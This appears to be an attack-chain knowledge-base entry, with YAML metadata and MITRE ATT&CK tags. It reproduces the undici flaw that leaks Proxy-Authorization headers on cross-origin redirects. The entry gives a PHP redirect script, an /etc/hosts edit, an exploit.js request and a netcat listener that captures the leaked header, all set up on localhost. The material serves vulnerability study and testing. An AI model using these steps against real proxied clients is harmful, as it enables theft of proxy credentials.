---
tags:
  - information-disclosure
  - header-leakage
  - proxy-auth
  - cross-origin-redirect
  - undici
type: attack_chain
tools:
  - '[[tools/undici]]'
  - '[[tools/PHP]]'
tactics:
  - '[[Collection]]'
commands:
  - '[[commands/add-hosts-entry]]'
verified: false
platforms:
  - Node.js
  - Web
submitted: true
complexity: medium
created_at: '2023-10-01T00:00:00Z'
procedures:
  - '[[procedures/Set-Up-Local-Redirect-Server-with-PHP]]'
  - '[[procedures/Configure-Local-DNS-Resolution-for-Cross-Origin-Simulation]]'
  - '[[procedures/Execute-Undici-Request-with-Sensitive-Proxy-Headers]]'
  - '[[procedures/Capture-Leaked-Headers-on-Target-Port]]'
step_count: 4
techniques:
  - '[[Unsecured Credentials]]'
  - '[[Exfiltration Over Alternative Protocol]]'
updated_at: '2025-12-14T17:30:26.634Z'
description: >-
  Demonstrates information disclosure by exploiting undici's failure to clear
  Proxy-Authorization headers during cross-origin redirects, leaking proxy
  credentials to malicious servers.
skill_level: intermediate
impact_level: high
id: 1b95d0b0-280b-45ea-8fd5-5a146c05d611
validated: true
mitre_tactics:
  - '[[Collection]]'
mitre_techniques:
  - '[[Unsecured Credentials]]'
  - '[[Exfiltration Over Alternative Protocol]]'
---
# Proxy-Authorization Header Leakage via Cross-Origin Redirect in Undici

Multi-stage attack chain demonstrating a complete attack workflow for exploiting a vulnerability in the undici Node.js HTTP client library, where Proxy-Authorization headers persist across cross-origin redirects, leading to credential leakage to unintended servers.

## Chain Metrics Dashboard

| Metric | Value |
|--------|-------|
| Chain Status | Unverified |
| Total Steps | 4 |
| Execution Time | ~5 minutes |
| Skill Level | Intermediate |
| Complexity | Medium |
| Impact Level | High |

## Attack Flow Visualization

```mermaid
graph LR
    A[Set Up Redirect Server] --> B[Configure DNS for Cross-Origin]
    B --> C[Send Request with Undici]
    C --> D[Capture Leaked Headers]

    style A fill:#e74c3c
    style B fill:#f39c12
    style C fill:#3498db
    style D fill:#27ae60
```

## Prerequisites & Requirements

### Required Tools

- [[tools/undici]]
- [[tools/PHP]]

### Target Environment

- Node.js environment (versions up to 6.7.0 vulnerable)
- Local server setup with PHP
- Port 2333 open for listening
- Access to /etc/hosts file for DNS simulation

### Initial Access Requirements

- Local machine with Node.js and PHP installed
- No remote credentials needed; simulates client-side request from a proxied environment
- Network access to localhost ports

## Detailed Attack Procedures

### Step 1: Set Up Local Redirect Server
procedure: [[procedures/Set-Up-Local-Redirect-Server-with-PHP]]

**Objective**: Create a malicious redirect endpoint that forces a cross-origin redirect to a controlled server, simulating an attacker's site.

**Instructions**: Use [[tools/PHP]] to start a simple HTTP server on localhost that redirects requests to the target endpoint.

Create and run a PHP script (e.g., redirect.php):

```php
<?php header('Location: http://a.com:2333'); ?>
```

Then start the server:

```bash
php -S 127.0.0.1:80
```

**Expected Output**: Server listening on http://127.0.0.1/, redirecting any request to http://a.com:2333.

**Success Indicators**:
- PHP server starts without errors
- Accessing http://127.0.0.1/ in a browser redirects to http://a.com:2333

### Step 2: Configure Local DNS Resolution
procedure: [[procedures/Configure-Local-DNS-Resolution-for-Cross-Origin-Simulation]]

**Objective**: Simulate a cross-origin redirect by mapping the redirect target to localhost, ensuring the request appears to go to a different origin.

**Instructions**: Edit the /etc/hosts file to resolve a.com to 127.0.0.1 using [[commands/add-hosts-entry]].

```bash
echo "127.0.0.1 a.com" | sudo tee -a /etc/hosts
```

**Expected Output**: Entry added to /etc/hosts; ping a.com resolves to 127.0.0.1.

**Success Indicators**:
- DNS resolution works: `ping a.com` shows 127.0.0.1
- No network errors in resolution

### Step 3: Execute Undici Request with Sensitive Headers
procedure: [[procedures/Execute-Undici-Request-with-Sensitive-Proxy-Headers]]

**Objective**: Send an HTTP request using undici that includes a Proxy-Authorization header, triggering the redirect and header persistence.

**Instructions**: Install undici if needed (`npm install undici`), then create and run a Node.js script (e.g., exploit.js) targeting the redirect server with sensitive headers.

```javascript
const { request } = require('undici');

request({
  origin: 'http://127.0.0.1/',
  pathname: '/',
  method: 'GET',
  headers: {
    'Proxy-Authorization': 'secret Proxy-Authorization'
  },
  maxRedirections: 1
});
```

Run with:

```bash
node exploit.js
```

**Expected Output**: Request sent; redirect follows, but Proxy-Authorization header leaks to the target.

**Success Indicators**:
- No errors in Node.js execution
- Request completes with redirect status

### Step 4: Capture Leaked Headers on Target Port
procedure: [[procedures/Capture-Leaked-Headers-on-Target-Port]]

**Objective**: Intercept the redirected request on the target port to verify and capture the leaked Proxy-Authorization header.

**Instructions**: Start a listener on port 2333 using netcat or a simple server to log incoming requests and headers.

```bash
nc -l 2333
```

Observe the incoming GET request; the Proxy-Authorization header should appear in the headers.

**Expected Output**: Logs show request with Proxy-Authorization: secret Proxy-Authorization.

**Success Indicators**:
- Incoming request received on port 2333
- Sensitive header visible in the captured request

## Attack Chain Summary

### Key Achievements

1. Successful simulation of cross-origin redirect
2. Demonstration of Proxy-Authorization header persistence in undici
3. Capture of leaked proxy credentials, enabling potential unauthorized proxy access

## Technique & Tactic Coverage

### MITRE ATT&CK Techniques

- [[Unsecured Credentials]] Unsecured Credentials
- [[Exfiltration Over Alternative Protocol]] Exfiltration Over Alternative Protocol

### MITRE ATT&CK Tactics

- [[Collection]] Collection

---
*Last updated: 2023-10-01T00:00:00Z*
